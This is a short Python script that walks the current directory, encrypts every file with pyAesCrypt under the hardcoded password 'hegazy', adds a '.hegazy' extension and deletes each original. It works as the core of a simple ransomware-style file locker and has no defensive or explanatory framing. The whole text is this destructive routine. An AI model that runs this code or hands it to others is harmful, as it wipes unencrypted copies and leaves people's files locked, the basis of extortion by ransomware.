import pyAesCrypt
import os
import re

def encrypt_and_delete(file):
	buffersize=64*1024
	password="hegazy"
	
	pyAesCrypt.encryptFile(file, file +".hegazy",password,buffersize)
	os.remove(file)

files=os.listdir()

for file in files:
	encrypt_and_delete(file)

